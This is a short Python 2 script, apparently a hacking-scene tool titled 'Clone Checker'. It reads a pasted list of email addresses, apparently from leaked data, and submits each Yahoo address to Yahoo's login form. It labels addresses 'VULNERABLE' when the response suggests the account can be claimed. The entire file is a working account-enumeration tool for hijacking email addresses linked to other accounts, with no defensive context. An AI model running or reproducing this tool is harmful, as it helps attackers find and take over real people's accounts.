# encoding=utf8
# Author: Marx Chryz
import os, sys, mechanize
reload(sys)
sys.setdefaultencoding('utf8')
browser = mechanize.Browser()
browser.set_handle_robots(False)
os.system("clear")
def main():
    banner()
    print('\033[39m[\033[31m+\033[39m] Paste here then press enter and type \'y\'')
    f = open('list.txt','w')
    while True:
        paste = raw_input()
        if paste == 'y':
            break
        f.write(paste+' ')
    f.close()
    os.system('clear')
    banner()
    print ('\033[39m[\033[31m+\033[39m] Processing...\n')
    raw = (open('list.txt','r').read())
    raw1 = ''
    for r in raw:
        raw1 += ' '.join(r.split('|'))
    emails = [data for data in raw1.split(' ') if '@' in data]
    for email in emails:
        try:
            if 'yahoo.com' in email:
                browser.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=sg&.lang=en-SG&.done=https://sg.yahoo.com')
                browser._factory.is_html = True
                browser.select_form(nr=0)
                browser['username'] = email
                browser.submit()
                if('login' in browser.title()):
                    print('[\033[32mVULNERABLE\033[37m] ' + email)
                else:
                    print('[\033[91mNOT vulnerable\033[37m] ' + email)
            else:
                pass
        except KeyError:
            pass
        except KeyboardInterrupt:
            print ('\n\033[39m[\033[31m+\033[39m] Exiting...\n')
            sys.exit()
        except:
            print ('\033[39m[\033[31m+\033[39m] Connection Error!')
            sys.exit()
def banner():
    print ('''
          \033[92m██████\033[37m╗ \033[92m██\033[37m╗\033[92m███\033[37m╗   \033[92m██\033[37m╗ \033[92m██████\033[37m╗ \033[92m██\033[37m╗   \033[92m██\033[37m╗ 
          \033[92m██\033[37m╔══\033[92m██\033[37m╗\033[92m██\033[37m║\033[92m████\033[37m╗  \033[92m██\033[37m║\033[92m██\033[37m╔═══\033[92m██\033[37m╗╚\033[92m██\033[37m╗ \033[92m██\033[37m╔╝ 
          \033[92m██████\033[37m╔╝\033[92m██\033[37m║\033[92m██\033[37m╔\033[92m██\033[37m╗ \033[92m██\033[37m║\033[92m██\033[37m║   \033[92m██\033[37m║ ╚\033[92m████\033[37m╔╝ 
          \033[92m██\033[37m╔═══╝ \033[92m██\033[37m║\033[92m██\033[37m║╚\033[92m██╗██\033[37m║\033[92m██\033[37m║   \033[92m██\033[37m║  ╚\033[92m██\033[37m╔╝
          \033[92m██\033[37m║     \033[92m██\033[37m║\033[92m██\033[37m║ ╚\033[92m████\033[37m║╚\033[92m██████\033[37m╔╝   \033[92m██\033[37m║
          \033[37m╚═╝     ╚═╝╚═╝ ╚═══╝ ╚═════╝     ╚═╝ 
                   \033[91mR E C O V E R E R S\033[37m
               ~CLONE CHECKER by R3d N0rth~
    ''')

if __name__=='__main__':
    main()
    
    
    
    
